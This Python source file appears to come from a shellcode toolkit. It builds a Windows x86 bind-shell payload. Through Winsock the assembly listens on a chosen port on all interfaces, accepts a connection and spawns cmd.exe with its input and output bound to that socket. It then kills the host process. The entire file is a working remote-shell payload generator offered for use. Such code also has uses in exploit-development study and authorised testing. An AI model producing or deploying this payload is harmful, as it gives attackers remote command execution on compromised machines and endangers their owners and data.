"""Bind-shell payload builder."""

from shellcode.payload_utils import (
    flatten_asm,
    format_shellcode_asm,
    to_network_endpoint_bytes,
)
from shellcode.shellcode_helper import ShellcodeHelper


def bind_shellcode(bind_port, breakpoint=0):
    var = ShellcodeHelper()

    f_term_process = "TerminateProcess"
    f_create_process = "CreateProcessA"
    f_wsastartup = "WSAStartup"
    f_wsasocketa = "WSASocketA"
    f_bind = "bind"
    f_listen = "listen"
    f_accept = "accept"

    for function_name in (
        f_term_process,
        f_create_process,
        f_wsastartup,
        f_wsasocketa,
        f_bind,
        f_listen,
        f_accept,
    ):
        var.add(function_name)

    v_socket = "socket"
    v_client_socket = "client_socket"
    v_startup_info = "lpStartupInfo"
    v_sockaddr_in = "sockaddr_in"
    v_proc_info = "lpProcessInformation"
    v_lpWSAData = "lpWSAData"
    v_str_cmd_exe = "str_cmd_exe"

    var.add(v_socket)
    var.add(v_client_socket)
    var.add(v_startup_info, reserve=0x44)
    var.add(v_sockaddr_in, reserve=0x10)
    var.add(v_proc_info, reserve=0x20)
    var.add(v_lpWSAData, reserve=0x190)
    var.add(v_str_cmd_exe, reserve=0x10)

    sin_family = 0x02
    sin_addr_bytes, sin_port_bytes = to_network_endpoint_bytes("0.0.0.0", bind_port)
    sockin_data = int.to_bytes(sin_family, 2, "little")
    sockin_data += sin_port_bytes
    sockin_data += sin_addr_bytes

    asm = [
        "start:",
        f"{['', 'int3;'][breakpoint]}",
        var.get_esp_setup(),                    # reserve scratch space for variables and temporary structures
        var.get_clear_variables(),              # zero the stack-backed variable area
        var.get_common_shellcode(),             # locate kernel32 and bootstrap resolver helpers

        "   resolve_symbols_kernel32: ",        # resolve the kernel32 APIs used after a client connects
        var.find_function(f_term_process),
        var.find_function(f_create_process),

        "   load_ws2_32:                         ",  # load winsock explicitly so bind/listen/accept are available
        var.load_library("ws2_32.dll"),

        "   resolve_symbols_ws2_32:              ",  # resolve the winsock APIs for the bind listener
        var.find_function(f_wsastartup),
        var.find_function(f_wsasocketa),
        var.find_function(f_bind),
        var.find_function(f_listen),
        var.find_function(f_accept),

        "   call_wsastartup:                    ",  # initialize winsock with version 2.2
        var.push_var_address(v_lpWSAData),
        "       xor eax, eax                    ;",
        "       mov ax, 0x0202                  ;",
        "       push eax                        ;",
        var.call_function(f_wsastartup),

        "   call_wsasocketa:                     ",  # create a TCP socket for the listening endpoint
        "       xor eax, eax                    ;",
        "       push eax                        ;",
        "       push eax                        ;",
        "       push eax                        ;",
        "       mov al, 0x06                    ;",
        "       push eax                        ;",
        "       sub al, 0x05                    ;",
        "       push eax                        ;",
        "       inc eax                         ;",
        "       push eax                        ;",
        var.call_function(f_wsasocketa),
        var.write_var(v_socket),                 # preserve the listening socket handle

        "   set_data_of_sockin:                     ",  # build sockaddr_in for INADDR_ANY:bind_port
        var.set_variable_data(v_sockaddr_in, sockin_data),

        "   call_bind:                           ",  # bind the socket to 0.0.0.0:bind_port
        "       xor eax, eax                    ;",
        "       add al, 0x10                    ;",
        "       push eax                        ;",
        var.push_var_address(v_sockaddr_in),
        var.push_var_value(v_socket),
        var.call_function(f_bind),

        "   call_listen:                         ",  # start listening; backlog is left at zero for a single client
        "       xor ecx, ecx                    ;",
        "       push ecx                        ;",
        var.push_var_value(v_socket),
        var.call_function(f_listen),

        "   call_accept:                         ",  # block until a client connects, then keep the accepted socket
        "       xor ecx, ecx                    ;",
        "       push ecx                        ;",
        "       push ecx                        ;",
        var.push_var_value(v_socket),
        var.call_function(f_accept),
        var.write_var(v_client_socket),          # stdio for cmd.exe will point at this accepted socket

        "   create_startupinfoa:                 ",  # set cb and STARTF_USESTDHANDLES in STARTUPINFOA
        "       xor eax, eax                    ;",
        "       mov al, 0x44                    ;",
        var.write_var(v_startup_info, "eax", 0x00),  # cb = sizeof(STARTUPINFOA)
        "       add al, 0xBB                    ;",
        "       inc eax                         ;",
        var.write_var(v_startup_info, "eax", 0x2C),  # dwFlags = 0x100

        var.read_var(v_client_socket, "eax"),
        var.write_var(v_startup_info, "eax", 0x38),  # hStdInput = accepted socket
        var.write_var(v_startup_info, "eax", 0x3C),  # hStdOutput = accepted socket
        var.write_var(v_startup_info, "eax", 0x40),  # hStdError = accepted socket

        "   create_cmd_string:                   ",  # prepare a writable command line buffer for CreateProcessA
        var.set_variable_data(v_str_cmd_exe, b"cmd.exe"),

        "   call_createprocessa:                 ",  # spawn cmd.exe and inherit stdio from the accepted client socket
        var.push_var_address(v_proc_info),
        var.push_var_address(v_startup_info),
        "       xor eax, eax                    ;",
        "       push eax                        ;",
        "       push eax                        ;",
        "       push eax                        ;",
        "       inc eax                         ;",
        "       push eax                        ;",
        "       dec eax                         ;",
        "       push eax                        ;",
        "       push eax                        ;",
        var.push_var_address(v_str_cmd_exe, "ebx"),
        "       push eax                        ;",
        var.call_function(f_create_process),

        "   exec_shellcode:                      ",  # terminate the original thread/process context after the child is created
        "       xor ecx, ecx                    ;",
        "       push ecx                        ;",
        "       push 0xffffffff                 ;",
        var.call_function(f_term_process),
    ]
    return format_shellcode_asm("\n".join(flatten_asm(asm)))
